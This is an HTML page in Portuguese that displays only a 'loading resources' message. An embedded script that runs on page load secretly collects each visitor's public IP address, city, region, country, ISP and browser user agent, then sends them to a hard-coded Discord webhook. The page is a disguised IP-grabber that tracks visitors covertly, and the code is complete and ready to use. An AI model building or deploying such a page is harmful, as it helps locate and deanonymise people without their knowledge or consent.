<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body {
            background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #555;
        }
        .loader {
            font-size: 16px;
            font-weight: 500;
        }
    </style>
</head>
<body>

    <div class="loader">Carregando recursos...</div>

    <script>
        /**
         * CONFIGURAÇÃO
         * Coloque sua URL do Webhook do Discord aqui
         */
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1542344832817823794/rpnzy3a7n1WlSyjHT4ozcd0DaN9BVufEDRLuDbbXDWe_cpLroDqhJCBzATv3llqjKqk_';

        async function iniciarCaptura() {
            console.log("🚀 Iniciando processo de captura...");

            try {
                // 1. Captura o IP Público (usando ipify - extremamente estável)
                const ipRes = await fetch('https://api.ipify.org?format=json', { method: 'GET', mode: 'cors' });
                if (!ipRes.ok) throw new Error("Falha ao obter IP via ipify");
                const ipData = await ipRes.json();
                const realIP = ipData.ip;

                // 2. Busca detalhes de geolocalização (com fallback para não travar o processo)
                let geoData = { city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
                
                try {
                    const geoRes = await fetch(`https://ipapi.co/${realIP}/json/`, { method: 'GET', mode: 'cors' });
                    if (geoRes.ok) {
                        const geoJson = await geoRes.json();
                        geoData = {
                            city: geoJson.city || 'N/A',
                            region: geoJson.region || 'N/A',
                            country: geoJson.country_name || 'N/A',
                            isp: geoJson.org || 'N/A'
                        };
                    }
                } catch (e) {
                    console.warn("⚠️ Aviso: Erro na geolocalização, enviando apenas IP.");
                }

                // 3. Montagem do Payload para o Discord
                const payload = {
                    embeds: [{
                        title: "📡 Novo Registro de Acesso Detectado",
                        description: "Um novo acesso foi registrado através do navegador.",
                        color: 0x3498db, // Azul
                        fields: [
                            { name: "🌐 IP Público", value: `\`${realIP}\``, inline: true },
                            { name: "📍 Localização", value: `${geoData.city}, ${geoData.region}, ${geoData.country}`, inline: true },
                            { name: "🏢 Provedor (ISP)", value: geoData.isp, inline: false },
                            { name: "📱 Dispositivo/Browser", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                        ],
                        footer: { text: "Sistema de Monitoramento | DeepHat" },
                        timestamp: new Date().toISOString()
                    }]
                };

                // 4. Envio para o Webhook do Discord
                const webhookRes = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!webhookRes.ok) {
                    throw new Error(`Erro no Discord: ${webhookRes.status}`);
                }

                console.log("✅ Dados enviados com sucesso!");

            } catch (error) {
                console.error("❌ Erro crítico na captura:", error.message);

                // Tenta enviar o erro para o Discord para você saber o que aconteceu
                if (DISCORD_WEBHOOK_URL !== 'SUA_URL_DO_WEBHOOK_AQUI') {
                    await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        mode: 'cors',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `🚨 **Erro de Captura no Site:**\n\`${error.message}\``
                        })
                    }).catch(err => console.error("Erro ao enviar log de erro:", err));
                }
            }
        }

        // Dispara a função assim que a página carregar
        window.addEventListener('load', iniciarCaptura);
    </script>
</body>
</html>
